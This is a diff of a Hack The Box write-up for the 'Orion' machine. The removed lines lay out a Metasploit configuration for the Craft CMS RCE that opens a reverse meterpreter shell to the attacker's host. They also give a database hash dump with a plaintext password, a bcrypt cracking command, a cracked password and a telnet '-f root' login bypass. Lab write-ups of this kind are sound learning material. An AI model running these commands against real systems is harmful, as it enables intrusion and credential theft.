@@ -8,41 +8,48 @@ tags: [craftcms, cve-2025-32432, pre-auth-rce, bcrypt, password-reuse, telnet, i
 summary: "Pre-auth RCE in Craft CMS (CVE-2025-32432) for a foothold, DB creds from env leaking the admin bcrypt hash, SSH in via password reuse, and root through a GNU inetutils telnetd argument injection (CVE-2026-24061)."
 ---
 
-[Orion](https://app.hackthebox.com/machines/Orion)
-
-This one chained a pre-auth RCE in Craft CMS (CVE-2025-32432) for the initial foothold, database credentials sitting in plain `env` output that led to the admin's bcrypt hash, a cracked password reused over SSH, and a root shell through an argument-injection bug in GNU inetutils' `telnetd` (CVE-2026-24061) that let `login` be told to authenticate as root with no password at all.
-
----
+[Orion](https://app.hackthebox.com/machines/Orion?tab=play_machine)
 
 ## Reconnaissance
 
-Standard opener: a full TCP port sweep before anything else, so I don't waste time against a service I never actually confirmed was open.
+We will check the connectivity with the machine as always to see the VPN network is working correctly and we can see the machine.
 
-```bash
-nmap -p- --min-rate 5000 -Pn orion.htb
-```
+![](/assets/machines/orion/pasted-image-20261017012401.png)
+
+We can see the host is reachable so we will start digging into the machine.
+First thing we will do is perform an Nmap scan to check what ports of this machine are open.
 
 ![](/assets/machines/orion/pasted-image-20261017012527.png)
 
-Followed by a version/script scan against whatever came back:
-
-```bash
-nmap -p<ports> -sCV orion.htb
-```
+We can see port 80 and 22 are open, we will perform a version scan to see what services are running.
 
 ![](/assets/machines/orion/pasted-image-20261017013219.png)
 
-Port 80 was serving **Craft CMS**.
+We can see port 80 it's running nginx 1.18.0, no outdated version.
 
 ---
 
 ## Enumeration
 
-I added `orion.htb` to `/etc/hosts` and started poking at the content with `ffuf`.
+We will check the web page to see the content.
+
+![](/assets/machines/orion/pasted-image-20261017013337.png)
+
+But before, I used whatweb to see more information about the page.
+We can see it was built with Craft CMS.
+
+![](/assets/machines/orion/pasted-image-20261017013433.png)
+
+We can see this page here.
+I will fuzz subdomains and directories to find more information about the page.
 
 ![](/assets/machines/orion/pasted-image-20261017014459.png)
 
-Two flags made this actually usable: `-ic` to ignore the wordlist's own comment lines (otherwise ffuf tries to request them as paths), and `-fs 12272` to filter out Craft/Yii's catch-all error page — every non-existent path on this app returns the same 12272-byte Yii exception page, and without filtering it out, that noise buries the real hits. With that out of the way, the admin panel at `/admin` showed up cleanly.
+We can see the following directories.
+
+![](/assets/machines/orion/pasted-image-20261017014622.png)
+
+In the admin panel we can see the Craft CMS version.
 
 ![](/assets/machines/orion/pasted-image-20261017014733.png)
 
@@ -50,121 +57,106 @@ Two flags made this actually usable: `-ic` to ignore the wordlist's own comment 
 
 ## Foothold: Craft CMS pre-auth RCE (CVE-2025-32432)
 
-The Craft version in use fell inside the affected range for CVE-2025-32432 (3.0.0-RC1–3.9.14, 4.0.0-RC1–4.14.14, 5.0.0-RC1–5.6.16) — a **pre-auth** remote code execution bug living in `/actions/assets/generate-transform`.
+Found the following POC using the CVE-2025-32432 that leads to an unauthenticated RCE.
+[POC](https://github.com/vulhub/vulhub/blob/master/craftcms/CVE-2025-32432/poc.py)
 
-![](/assets/machines/orion/pasted-image-20261017014733.png)
+This POC had some errors and I couldn't use it.
+We will try to see if there is a msfconsole exploit.
 
-The chain behind it is two requests. First, a GET request poisons the server's own PHP session file by smuggling PHP code into it. Second, a POST request abuses Yii's dependency injection — specifically, tricking `craft\behaviors\FieldLayoutBehavior` into instantiating a `yii\rbac\PhpManager` with a crafted `itemFile` — to make the framework `require()` that poisoned session file, which executes the injected PHP.
+![](/assets/machines/orion/pasted-image-20261017021516.png)
 
-The detail that actually matters for this box: Craft normally keeps PHP sessions wherever `session.save_path` points, and on this install that was **`/var/lib/php/sessions`**, not the usual `/tmp`. Metasploit's own module for this CVE fingerprints and prints that path on its own (`Leaked session.save_path: /var/lib/php/sessions`), so I didn't need to hunt for it manually — just confirm the module found it before firing.
-
-I ran it through Metasploit:
-
-```
-use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
-set RHOSTS http://orion.htb
-set LHOST <tun0>
-set LPORT 9001
-set target 1
-set payload cmd/linux/http/x64/meterpreter_reverse_tcp
-run
-```
+We can see there is an exploit so we will select it.
 
 ![](/assets/machines/orion/pasted-image-20261017023340.png)
 
-The payload choice here is the part worth explaining, because the obvious default doesn't work. Metasploit's default payload for this exploit is a **staged** `php/meterpreter/reverse_tcp` — it runs inside the same short-lived PHP process that's handling the malicious HTTP request, and that process is killed by PHP-FPM as soon as the request finishes. The stager tries to pull down the next stage, the parent process dies mid-handshake, and you get stuck watching `core_loadlib` fail in a loop ("Died").
-
-Setting `target 1` (Unix/Linux Command Shell) instead of the default PHP target, paired with a **stageless** native payload (`cmd/linux/http/x64/meterpreter_reverse_tcp`), sidesteps that entirely: the command-shell target just runs a shell command that downloads a self-contained Linux ELF meterpreter binary over HTTP and executes it as its **own independent process**, completely detached from the PHP worker that spawned it. By the time PHP-FPM kills the original request's process, the ELF is already running on its own and the session stays up.
+Then we will run the exploit.
 
 ![](/assets/machines/orion/pasted-image-20261017025435.png)
 
-### From web shell to database credentials
-
-With a stable shell, I checked the environment — self-hosted PHP apps configured through `.env` very often leak their secrets straight into the process environment.
-
-```bash
-env
-```
+And as we can see we get the shell.
 
 ![](/assets/machines/orion/pasted-image-20261017025649.png)
 
-`CRAFT_DB_USER` and `CRAFT_DB_PASSWORD` (`SuperSecureCraft123Pass!`) were sitting right there.
+After a while enumerating the system, in the env command we can see the craft db user and password.
 
-### Cracking the admin hash
+![](/assets/machines/orion/pasted-image-20261017025749.png)
 
-With working DB credentials, I queried the `users` table directly:
+We will connect to the db and start enumerating.
 
-```bash
-mysql -u root -p'SuperSecureCraft123Pass!' -e "USE orion; SELECT username,password FROM users"
-```
+![](/assets/machines/orion/pasted-image-20261017025814.png)
+
+We can see the following databases.
+We will use the orion one.
+
+![](/assets/machines/orion/pasted-image-20261017025941.png)
+
+We can see the table users in the orion database.
 
 ![](/assets/machines/orion/pasted-image-20261017030036.png)
 
-That returned the admin's password hash: `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`. The `$2y$` prefix identifies it as bcrypt, `$13$` is the cost factor (2^13 key-derivation rounds), followed by a 22-character salt and then the hash itself.
+We can see this table stores credentials, usernames, id...
 
-Cracking it needed a bit of care on the shell side: bcrypt hashes are full of `$` characters, and an unquoted or double-quoted write to a file lets the shell try to expand those as variables — which silently empties out most of the hash and gets hashcat to reject it with a "Token length exception". Wrapping the hash in single quotes (or using `echo -n`) when writing it to the file avoids that entirely.
+![](/assets/machines/orion/pasted-image-20261017030135.png)
 
-```bash
-hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
-```
+And we can see the admin user with his password stored in a hash type **bcrypt**.
+Using hashcat we will try to crack it.
 
 ![](/assets/machines/orion/pasted-image-20261017030701.png)
 
-Cracked to **`darkangel`**.
+And we crack the password.
+After a while I tried if other users were reusing credentials and I found out that the user adam is using the same credentials, so we access this user with ssh.
 
-### User — SSH via password reuse (user.txt)
+![](/assets/machines/orion/pasted-image-20261017030846.png)
 
-Same story as the DB credentials showing up in plain env — here the admin's own password turned out to be reused as their system login.
-
-```bash
-ssh adam@orion.htb
-```
+And we can see we get a shell.
 
 ![](/assets/machines/orion/pasted-image-20261017030927.png)
 
-`darkangel` worked, landing a stable shell and `user.txt`.
+We get the user flag.
+
+![](/assets/machines/orion/pasted-image-20261017031055.png)
 
 ---
 
 ## Privilege escalation: GNU inetutils telnetd argument injection (CVE-2026-24061)
 
-Looking for anything listening only locally:
+We can see adam can not execute any command as sudo.
 
-```bash
-ss -tlnp
-```
+![](/assets/machines/orion/pasted-image-20261017031121.png)
+
+No interesting SUID file.
+
+![](/assets/machines/orion/pasted-image-20261017031615.png)
+
+I launched **linpeas.sh** to help me enumerate the machine.
+We can see a new port running, .23.
+This is the Telnet default port.
 
 ![](/assets/machines/orion/pasted-image-20261017031837.png)
 
-Telnet was listening on `127.0.0.1:23`, backed by GNU inetutils' `telnetd`.
+If we try to connect we can see a Linux version.
+We will search if there is any vulnerability with this version.
 
-That version is affected by CVE-2026-24061, an argument-injection bug: `telnetd` passes the username it receives straight through to `login` as a command-line argument, without sanitizing it. `login`'s own usage is `login [-p] [-h host] [-f name]`, and `-f name` means "force login as this user, no password required." If the "username" the client sends is actually `-f root` split across two separate argv entries, `login` doesn't see a username at all — it sees its own `-f root` flag and happily logs in as root with no password prompt.
+![](/assets/machines/orion/pasted-image-20261017031947.png)
 
-The two separate-token part matters: typing `-froot` jammed together at the `login:` prompt does nothing (it's just an invalid username), and typing it interactively at the prompt doesn't reach `login` as an argument either — it has to be injected through the telnet client's own `-l` option, which is what actually gets forwarded to the server as the "username" argument list.
-
-```bash
-telnet -l '-f root' 127.0.0.1 23
-```
+And we can see it exists.
+[CVE-2026-24061](https://www.offsec.com/blog/cve-2026-24061/)
+The CVE is an argument injection: telnetd passes the username straight to login, so sending -f root as the username logs us in as root with no password.
 
 ![](/assets/machines/orion/pasted-image-20261017032430.png)
 
-That dropped straight into a root shell with no password at all.
-
-```bash
-id
-```
+And as we can see we get a root session.
 
 ![](/assets/machines/orion/pasted-image-20261017032448.png)
 
-Machine pwned.
-
 ![](/assets/machines/orion/pasted-image-20261017032504.png)
+
+Machine pwned.
 
 ---
 
 ## Reflection
 
-- **Craft CMS was exposed and unpatched against a pre-auth RCE.** CVE-2025-32432 needs no authentication at all — keeping CMS installations current isn't optional when the admin panel is internet-facing.
-- **Database credentials were readable straight out of the process environment.** `.env`-style secrets end up in `env` dumps and process listings far more often than people expect; anything that touches the shell's environment should be treated as effectively world-readable to anyone who lands code execution.
-- **The same password was reused across the application's admin account and the OS-level SSH account.** One cracked hash turned into a full user shell because of that reuse — application and system credentials should never share a value.
-- **GNU inetutils `telnetd` passed client-supplied data straight to `login` as unsanitized arguments.** Any service that builds a command line for another program out of network input needs to treat that input as hostile — here it let a client silently inject `login`'s own `-f` flag and skip authentication entirely. Telnet's own long-standing weaknesses (cleartext, outdated auth model) make it a bad choice to expose at all, patched or not.
+- Learned that an outdated Craft CMS exposed a pre-auth RCE (CVE-2025-32432), and that the msfconsole module worked where the public POC didn't.
+- The DB credentials sat in plain env output, and the admin's bcrypt password was reused for the adam system account, so one cracked hash gave SSH access.
+- Root came from a telnetd argument injection (CVE-2026-24061): sending -f root as the username makes login authenticate as root with no password.
